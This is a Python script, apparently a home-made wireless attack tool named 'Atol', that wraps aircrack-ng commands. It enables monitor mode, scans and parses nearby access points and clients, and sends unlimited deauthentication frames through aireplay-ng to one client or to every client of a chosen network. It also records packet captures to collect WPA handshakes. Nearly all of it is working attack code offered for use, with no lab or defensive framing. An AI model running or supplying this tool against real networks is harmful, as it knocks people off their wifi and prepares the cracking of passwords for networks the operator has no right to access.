import subprocess
import time
import csv
import os

PREFIX = "atol-dump"

class AccessPoint:
    def __init__(self, bssid, channel, privacy, power, essid):
        self.bssid = bssid
        self.channel = channel
        self.privacy = privacy
        self.power = power
        self.essid = essid

class Client:
    def __init__(self, mac, bssid, power):
        self.mac = mac
        self.bssid = bssid
        self.power = power

class Atol:
    def __init__(self):
        pass

    def enable_monitor_mode(self, interface="wlan1"):
        cmd = ["airmon-ng", "start", interface]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()

    def scan_for_aps(self, interface="wlan1", scan_time=5):
        cmd = ["airodump-ng", "--write", PREFIX, "--output-format", "csv", interface]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(scan_time)

        process.kill()
        process.wait()

        out = []
        with open(f"{PREFIX}-01.csv", "r") as f:
            reader = csv.reader(f)
            for row in reader:
                out.append(row)

        return out
    
    def parse_csv(self, filename):
        out = ([],[])
        with open(filename, "r") as f:
            reader = csv.reader(f)
            text = f.read()
            
            sections = text.split("\n\n")
            aps_section = sections[0].strip().split("\n")
            clients_section = sections[1].strip().split("\n")
            for row in range(1, len(aps_section)):
                splited = aps_section[row].split(",")
                ap = AccessPoint(
                    bssid=splited[0].strip(),
                    channel=splited[3].strip(),
                    privacy=splited[5].strip(),
                    power=splited[8].strip(),
                    essid=splited[13].strip()
                )
                out[0].append(ap)
            for row in range(1, len(clients_section)):
                splited = clients_section[row].split(",")
                if len(splited) < 3:
                    continue
                client = Client(
                    mac=splited[0].strip(),
                    bssid=splited[5].strip(),
                    power=splited[3].strip()
                )
                out[1].append(client)
        return out

        

    def deauthenticate_client(self, bssid, client_mac, interface="wlan1"):
        cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client_mac, interface]
        subprocess.run(cmd)

    def deauthenticate_all(self, bssid, interface="wlan1"):
        cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, interface]
        subprocess.run(cmd)

    def scan_for_handshakes(self, interface="wlan1", scan_time=10):
        prefix = "dump"
        cmd = ["airodump-ng", "--write", prefix, "--output-format", "cap", interface]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(scan_time)

        process.kill()
        process.wait()


a = Atol()
a.enable_monitor_mode()
a.scan_for_aps()

dumps = []
for f in os.listdir("."):
    if PREFIX in f:
        dumps.append(f)

print(dumps)

for ap in a.parse_csv(f"{PREFIX}-01.csv")[0]:
    print(f"BSSID: {ap.bssid}, ESSID: {ap.essid}, Channel: {ap.channel}, Privacy: {ap.privacy}, Power: {ap.power}")
for client in a.parse_csv(f"{PREFIX}-01.csv")[1]:
    print(f"MAC: {client.mac}, BSSID: {client.bssid}, Power: {client.power}")